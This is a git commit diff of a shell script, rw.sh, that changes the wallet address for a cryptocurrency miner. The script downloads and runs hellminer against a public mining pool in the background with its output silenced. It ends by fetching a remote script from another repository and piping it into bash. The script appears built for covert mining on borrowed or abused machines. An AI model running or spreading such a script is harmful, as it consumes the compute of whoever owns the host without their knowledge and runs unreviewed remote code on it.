87134a51f186eb806147a6302817c2016c40ce3c
malogrono <136266511+malogrono@users.noreply.github.com>
2026-04-07 13:56:05 +0700

    Update rw.sh

--- rw.sh
+++ rw.sh
@@ -3,5 +3,5 @@ sudo apt update
 sudo apt install screen -y
 wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz >/dev/null 2>&1
 tar -xvf hellminer_linux64.tar.gz
-./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F."A$RANDOM" >/dev/null 2>&1 &
+./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RPw1mcxaVvVcUicUqMmqon6n88esCrN3SP."A$RANDOM" >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
